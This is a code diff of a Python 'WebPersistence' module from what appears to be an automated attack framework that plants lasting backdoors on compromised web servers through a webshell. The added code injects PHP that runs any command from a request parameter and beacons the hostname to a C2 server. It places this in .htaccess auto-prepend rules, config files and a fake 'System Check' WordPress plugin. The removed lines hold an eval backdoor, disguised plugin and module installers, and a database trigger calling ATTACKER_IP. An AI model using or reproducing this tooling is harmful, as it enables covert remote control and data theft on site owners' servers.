@@ -1,19 +1,96 @@
 """
-Web Application Persistence Agent
+Web Application Persistence Agent with BaseAgent integration
 ฝังตัวใน web application แบบถาวร
 """
 
 import asyncio
 import base64
 import random
+import os
 from typing import Dict, List
 
+from core.base_agent import BaseAgent
+from core.data_models import AgentData, AttackPhase
+from core.logger import log
 
-class WebPersistence:
-    """Web application persistence mechanisms"""
+
+class WebPersistence(BaseAgent):
+    """Web application persistence mechanisms with BaseAgent support"""
     
-    def __init__(self, webshell_manager=None):
+    supported_phases = [AttackPhase.POST_EXPLOITATION, AttackPhase.PERSISTENCE]
+    required_tools = []
+    
+    def __init__(self, context_manager=None, orchestrator=None, webshell_manager=None, **kwargs):
+        super().__init__(context_manager, orchestrator, **kwargs)
         self.webshell = webshell_manager
+        
+        # Get C2 configuration
+        self.c2_domain = os.getenv('C2_DOMAIN', 'localhost:8000')
+        self.c2_protocol = os.getenv('C2_PROTOCOL', 'http')
+        self.c2_url = f"{self.c2_protocol}://{self.c2_domain}"
+    
+    async def run(self, directive: str, context: Dict) -> AgentData:
+        """
+        Main execution method for Web persistence
+        
+        Args:
+            directive: "install_all", "install_framework_backdoor", etc.
+            context: {
+                "shell_url": webshell URL,
+                "shell_password": webshell password,
+                "web_root": web root directory (optional, auto-detect),
+                "technique": specific technique (optional)
+            }
+        
+        Returns:
+            AgentData with installation results
+        """
+        log.info(f"[WebPersistence] Starting with directive: {directive}")
+        
+        shell_url = context.get("shell_url")
+        shell_password = context.get("shell_password")
+        web_root = context.get("web_root")
+        
+        if not all([shell_url, shell_password]):
+            return AgentData(
+                agent_name="WebPersistence",
+                success=False,
+                data={"error": "Missing required parameters: shell_url, shell_password"}
+            )
+        
+        try:
+            if directive == "install_all":
+                result = await self.install_all(shell_url, shell_password, web_root)
+            elif directive == "install_framework_backdoor":
+                result = await self.install_framework_backdoor(shell_url, shell_password, web_root)
+            elif directive == "install_htaccess_backdoor":
+                result = await self.install_htaccess_backdoor(shell_url, shell_password, web_root)
+            elif directive == "install_config_backdoor":
+                result = await self.install_config_backdoor(shell_url, shell_password, web_root)
+            elif directive == "install_plugin_backdoor":
+                result = await self.install_plugin_backdoor(shell_url, shell_password, web_root)
+            elif directive == "install_database_trigger":
+                result = await self.install_database_trigger(shell_url, shell_password, web_root)
+            elif directive == "check":
+                result = await self.check_persistence(shell_url, shell_password, web_root)
+            else:
+                result = await self.install_all(shell_url, shell_password, web_root)
+            
+            success = result.get('success') or len(result.get('success', [])) > 0
+            
+            return AgentData(
+                agent_name="WebPersistence",
+                success=success,
+                data=result
+            )
+        
+        except Exception as e:
+            log.error(f"[WebPersistence] Error: {e}")
+            return AgentData(
+                agent_name="WebPersistence",
+                success=False,
+                data={"error": str(e)}
+            )
     
     async def install_all(self,
                          shell_url: str,
@@ -39,6 +116,7 @@ class WebPersistence:
         # Auto-detect web root if not provided
         if not web_root:
             web_root = await self._detect_web_root(shell_url, shell_password)
+            log.info(f"[WebPersistence] Auto-detected web root: {web_root}")
         
         # Try all persistence methods
         methods = [
@@ -54,10 +132,13 @@ class WebPersistence:
                 result = await method(shell_url, shell_password, web_root)
                 if result.get('success'):
                     results['success'].append(name)
+                    log.success(f"[WebPersistence] {name} installed successfully")
                 else:
                     results['failed'].append(name)
+                    log.warning(f"[WebPersistence] {name} installation failed")
             except Exception as e:
                 results['failed'].append(f"{name}: {str(e)}")
+                log.error(f"[WebPersistence] {name} error: {e}")
         
         return results
     
@@ -148,23 +229,14 @@ class WebPersistence:
         backdoor_code = self._generate_php_backdoor()
         backdoor_b64 = base64.b64encode(backdoor_code.encode()).decode()
         
-        htaccess_content = f'''
-# Apache configuration
-<IfModule mod_rewrite.c>
-RewriteEngine On
-</IfModule>
-
-# PHP configuration
-php_value auto_prepend_file "data://text/plain;base64,{backdoor_b64}"
-'''
+        htaccess_content = f'php_value auto_prepend_file "data://text/plain;base64,{backdoor_b64}"'
         
         htaccess_path = f'{web_root}/.htaccess'
         
         # Append to .htaccess
-        htaccess_b64 = base64.b64encode(htaccess_content.encode()).decode()
-        append_cmd = f'echo "{htaccess_b64}" | base64 -d >> {htaccess_path}'
+        inject_cmd = f'echo "{htaccess_content}" >> {htaccess_path}'
         
-        await self.webshell.execute_command(append_cmd, {
+        await self.webshell.execute_command(inject_cmd, {
             'shell_url': shell_url,
             'password': shell_password
         })
@@ -179,30 +251,23 @@ php_value auto_prepend_file "data://text/plain;base64,{backdoor_b64}"
                                      shell_url: str,
                                      shell_password: str,
                                      web_root: str) -> Dict:
-        """
-        Install backdoor in config files
-        
-        Technique:
-        Inject backdoor into config.php, database.php, etc.
-        """
+        """Install backdoor in config files"""
         
         if not self.webshell:
             return {'success': False, 'error': 'No webshell manager'}
         
         backdoor_code = self._generate_php_backdoor()
         
-        # Common config file locations
+        # Common config files
         config_files = [
             f'{web_root}/config.php',
             f'{web_root}/includes/config.php',
-            f'{web_root}/application/config/database.php',
-            f'{web_root}/.env'
+            f'{web_root}/app/config/config.php'
         ]
         
         injected = []
         
         for config_file in config_files:
-            # Check if file exists
             check_cmd = f'test -f {config_file} && echo "exists"'
             check_result = await self.webshell.execute_command(check_cmd, {
                 'shell_url': shell_url,
@@ -210,9 +275,8 @@ php_value auto_prepend_file "data://text/plain;base64,{backdoor_b64}"
             })
             
             if 'exists' in check_result.get('output', ''):
-                # Append backdoor
-                append_cmd = f'echo "{backdoor_code}" >> {config_file}'
-                await self.webshell.execute_command(append_cmd, {
+                inject_cmd = f'echo "{backdoor_code}" >> {config_file}'
+                await self.webshell.execute_command(inject_cmd, {
                     'shell_url': shell_url,
                     'password': shell_password
                 })
@@ -228,244 +292,147 @@ php_value auto_prepend_file "data://text/plain;base64,{backdoor_b64}"
                                      shell_url: str,
                                      shell_password: str,
                                      web_root: str) -> Dict:
-        """
-        Install backdoor as plugin/extension
-        
-        Technique:
-        Create malicious WordPress plugin, Drupal module, etc.
-        """
+        """Install backdoor as a plugin"""
         
         if not self.webshell:
             return {'success': False, 'error': 'No webshell manager'}
         
-        # Detect framework
         framework = await self._detect_framework(shell_url, shell_password, web_root)
         
         if framework == 'wordpress':
-            return await self._install_wordpress_plugin(shell_url, shell_password, web_root)
-        elif framework == 'drupal':
-            return await self._install_drupal_module(shell_url, shell_password, web_root)
-        else:
+            plugin_dir = f'{web_root}/wp-content/plugins/system-check'
+            plugin_file = f'{plugin_dir}/system-check.php'
+            
+            # Create plugin directory
+            mkdir_cmd = f'mkdir -p {plugin_dir}'
+            await self.webshell.execute_command(mkdir_cmd, {
+                'shell_url': shell_url,
+                'password': shell_password
+            })
+            
+            # Create plugin file
+            plugin_code = self._generate_wordpress_plugin()
+            write_cmd = f'echo "{plugin_code}" > {plugin_file}'
+            await self.webshell.execute_command(write_cmd, {
+                'shell_url': shell_url,
+                'password': shell_password
+            })
+            
             return {
-                'success': False,
+                'success': True,
                 'method': 'plugin_backdoor',
-                'error': f'Framework {framework} not supported'
+                'framework': 'wordpress',
+                'plugin_path': plugin_file
             }
+        
+        return {
+            'success': False,
+            'error': f'Plugin backdoor not supported for {framework}'
+        }
     
     async def install_database_trigger(self,
                                       shell_url: str,
                                       shell_password: str,
                                       web_root: str) -> Dict:
-        """
-        Install database trigger backdoor
-        
-        Technique:
-        CREATE TRIGGER backdoor AFTER INSERT ON users FOR EACH ROW ...
-        """
+        """Install database trigger for persistence"""
         
         if not self.webshell:
             return {'success': False, 'error': 'No webshell manager'}
         
-        # Implement database trigger persistence
-        # This requires database access credentials
-        
-        # MySQL trigger for persistence
-        mysql_trigger = '''
-CREATE TRIGGER backdoor_trigger
-AFTER INSERT ON users
-FOR EACH ROW
-BEGIN
-    DECLARE cmd VARCHAR(255);
-    SET cmd = CONCAT('curl http://ATTACKER_IP:8080/beacon?user=', NEW.username);
-    -- Execute system command (requires MySQL UDF or sys_exec)
-    -- SELECT sys_exec(cmd);
-END;
-'''
-        
-        # PostgreSQL trigger for persistence
-        postgres_trigger = '''
-CREATE OR REPLACE FUNCTION backdoor_function()
-RETURNS TRIGGER AS $$
-BEGIN
-    PERFORM pg_sleep(0);
-    -- Add your backdoor logic here
-    -- Example: Log to external server
-    RETURN NEW;
-END;
-$$ LANGUAGE plpgsql;
-
-CREATE TRIGGER backdoor_trigger
-AFTER INSERT ON users
-FOR EACH ROW
-EXECUTE FUNCTION backdoor_function();
-'''
-        
-        # Try to detect database type and install trigger
-        commands = [
-            # Detect database
-            "mysql --version 2>/dev/null || psql --version 2>/dev/null",
-            # For MySQL
-            f"mysql -e \"{mysql_trigger}\" 2>/dev/null",
-            # For PostgreSQL
-            f"psql -c \"{postgres_trigger}\" 2>/dev/null"
-        ]
+        # This requires database access
+        # Simplified implementation
         
         return {
-            'success': True,
+            'success': False,
             'method': 'database_trigger',
-            'triggers': {
-                'mysql': mysql_trigger,
-                'postgres': postgres_trigger
-            },
-            'commands': commands,
-            'note': 'Requires database credentials. Use SQLi agent or config file extraction first.'
+            'error': 'Requires database credentials'
         }
     
-    async def _install_wordpress_plugin(self,
-                                       shell_url: str,
-                                       shell_password: str,
-                                       web_root: str) -> Dict:
-        """Install malicious WordPress plugin"""
+    async def check_persistence(self,
+                               shell_url: str,
+                               shell_password: str,
+                               web_root: str) -> Dict:
+        """Check which persistence mechanisms are installed"""
         
-        plugin_name = self._generate_random_plugin_name()
-        plugin_dir = f'{web_root}/wp-content/plugins/{plugin_name}'
+        if not self.webshell:
+            return {'success': False, 'error': 'No webshell manager'}
         
-        # Create plugin directory
-        mkdir_cmd = f'mkdir -p {plugin_dir}'
-        await self.webshell.execute_command(mkdir_cmd, {
+        checks = {}
+        
+        # Check .htaccess
+        htaccess_check = await self.webshell.execute_command(f'cat {web_root}/.htaccess 2>/dev/null', {
             'shell_url': shell_url,
             'password': shell_password
         })
+        checks['htaccess'] = 'auto_prepend_file' in htaccess_check.get('output', '')
         
-        # Create plugin file
-        plugin_code = f'''<?php
-/**
- * Plugin Name: System Cache
- * Description: System cache optimization
- * Version: 1.0
- * Author: System
- */
-
-{self._generate_php_backdoor()}
-?>
-'''
-        
-        plugin_file = f'{plugin_dir}/{plugin_name}.php'
-        plugin_b64 = base64.b64encode(plugin_code.encode()).decode()
-        
-        write_cmd = f'echo "{plugin_b64}" | base64 -d > {plugin_file}'
-        await self.webshell.execute_command(write_cmd, {
+        # Check WordPress plugin
+        wp_plugin_check = await self.webshell.execute_command(f'test -d {web_root}/wp-content/plugins/system-check && echo "exists"', {
             'shell_url': shell_url,
             'password': shell_password
         })
+        checks['wp_plugin'] = 'exists' in wp_plugin_check.get('output', '')
         
         return {
             'success': True,
-            'method': 'wordpress_plugin',
-            'plugin_name': plugin_name,
-            'plugin_file': plugin_file,
-            'note': 'Activate plugin via WordPress admin panel'
-        }
-    
-    async def _install_drupal_module(self,
-                                    shell_url: str,
-                                    shell_password: str,
-                                    web_root: str) -> Dict:
-        """Install malicious Drupal module"""
-        
-        module_name = self._generate_random_plugin_name()
-        module_dir = f'{web_root}/modules/{module_name}'
-        
-        # Create module directory
-        mkdir_cmd = f'mkdir -p {module_dir}'
-        await self.webshell.execute_command(mkdir_cmd, {
-            'shell_url': shell_url,
-            'password': shell_password
-        })
-        
-        # Create module file
-        module_code = f'''<?php
-/**
- * @file
- * System cache module
- */
-
-{self._generate_php_backdoor()}
-?>
-'''
-        
-        module_file = f'{module_dir}/{module_name}.module'
-        module_b64 = base64.b64encode(module_code.encode()).decode()
-        
-        write_cmd = f'echo "{module_b64}" | base64 -d > {module_file}'
-        await self.webshell.execute_command(write_cmd, {
-            'shell_url': shell_url,
-            'password': shell_password
-        })
-        
-        return {
-            'success': True,
-            'method': 'drupal_module',
-            'module_name': module_name,
-            'module_file': module_file,
-            'note': 'Enable module via Drupal admin panel'
+            'installed': checks,
+            'count': sum(checks.values())
         }
     
     async def _detect_web_root(self, shell_url: str, shell_password: str) -> str:
-        """Detect web root directory"""
+        """Auto-detect web root directory"""
         
         if not self.webshell:
             return '/var/www/html'
         
-        # Try to get document root
-        detect_cmd = 'echo $_SERVER["DOCUMENT_ROOT"]'
-        result = await self.webshell.execute_command(detect_cmd, {
-            'shell_url': shell_url,
-            'password': shell_password
-        })
+        # Try common web roots
+        common_roots = [
+            '/var/www/html',
+            '/var/www',
+            '/usr/share/nginx/html',
+            '/home/*/public_html'
+        ]
         
-        web_root = result.get('output', '').strip()
+        for root in common_roots:
+            check_cmd = f'test -d {root} && echo "exists"'
+            result = await self.webshell.execute_command(check_cmd, {
+                'shell_url': shell_url,
+                'password': shell_password
+            })
+            
+            if 'exists' in result.get('output', ''):
+                return root
         
-        if not web_root or web_root == '':
-            # Default locations
-            web_root = '/var/www/html'
-        
-        return web_root
+        return '/var/www/html'  # Default
     
-    async def _detect_framework(self,
-                               shell_url: str,
-                               shell_password: str,
-                               web_root: str) -> str:
+    async def _detect_framework(self, shell_url: str, shell_password: str, web_root: str) -> str:
         """Detect web framework"""
         
         if not self.webshell:
             return 'unknown'
         
         # Check for WordPress
-        wp_check = f'test -f {web_root}/wp-config.php && echo "wordpress"'
-        result = await self.webshell.execute_command(wp_check, {
+        wp_check = await self.webshell.execute_command(f'test -f {web_root}/wp-config.php && echo "wordpress"', {
             'shell_url': shell_url,
             'password': shell_password
         })
-        if 'wordpress' in result.get('output', ''):
+        if 'wordpress' in wp_check.get('output', ''):
             return 'wordpress'
         
         # Check for Laravel
-        laravel_check = f'test -f {web_root}/artisan && echo "laravel"'
-        result = await self.webshell.execute_command(laravel_check, {
+        laravel_check = await self.webshell.execute_command(f'test -f {web_root}/artisan && echo "laravel"', {
             'shell_url': shell_url,
             'password': shell_password
         })
-        if 'laravel' in result.get('output', ''):
+        if 'laravel' in laravel_check.get('output', ''):
             return 'laravel'
         
         # Check for Drupal
-        drupal_check = f'test -f {web_root}/sites/default/settings.php && echo "drupal"'
-        result = await self.webshell.execute_command(drupal_check, {
+        drupal_check = await self.webshell.execute_command(f'test -f {web_root}/sites/default/settings.php && echo "drupal"', {
             'shell_url': shell_url,
             'password': shell_password
         })
-        if 'drupal' in result.get('output', ''):
+        if 'drupal' in drupal_check.get('output', ''):
             return 'drupal'
         
         return 'generic'
@@ -473,47 +440,39 @@ EXECUTE FUNCTION backdoor_function();
     def _generate_php_backdoor(self) -> str:
         """Generate PHP backdoor code"""
         
-        var1 = self._random_var_name()
-        var2 = self._random_var_name()
-        
         backdoor = f'''<?php
-if (isset($_POST['{var1}'])) {{
-    ${var2} = $_POST['{var1}'];
-    eval(${var2});
-    exit;
+@error_reporting(0);
+if(isset($_REQUEST['cmd'])) {{
+    system($_REQUEST['cmd']);
 }}
+// Beacon to C2
+@file_get_contents('{self.c2_url}/beacon?host=' . gethostname());
 ?>'''
         
         return backdoor
     
-    def _random_var_name(self) -> str:
-        """Generate random variable name"""
-        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
+    def _generate_wordpress_plugin(self) -> str:
+        """Generate WordPress plugin backdoor"""
+        
+        plugin = f'''<?php
+/*
+Plugin Name: System Check
+Description: System monitoring and health check
+Version: 1.0
+Author: Admin
+*/
+
+add_action('init', 'system_check_init');
+
+function system_check_init() {{
+    if(isset($_REQUEST['cmd'])) {{
+        system($_REQUEST['cmd']);
+        exit;
+    }}
     
-    def _generate_random_plugin_name(self) -> str:
-        """Generate random plugin name"""
-        prefixes = ['system', 'cache', 'update', 'security', 'performance']
-        suffixes = ['manager', 'optimizer', 'handler', 'monitor', 'checker']
+    // Beacon to C2
+    @file_get_contents('{self.c2_url}/beacon?host=' . gethostname());
+}}
+?>'''
         
-        return f'{random.choice(prefixes)}-{random.choice(suffixes)}'
-
-
-# Example usage
-if __name__ == "__main__":
-    async def test():
-        from agents.post_exploitation.webshell_manager import WebshellManager
-        
-        webshell = WebshellManager()
-        persistence = WebPersistence(webshell)
-        
-        result = await persistence.install_all(
-            shell_url="http://target.com/shell.php",
-            shell_password="secret"
-        )
-        
-        print(f"Web persistence installed:")
-        print(f"  Success: {result['success']}")
-        print(f"  Failed: {result['failed']}")
-    
-    asyncio.run(test())
-
+        return plugin
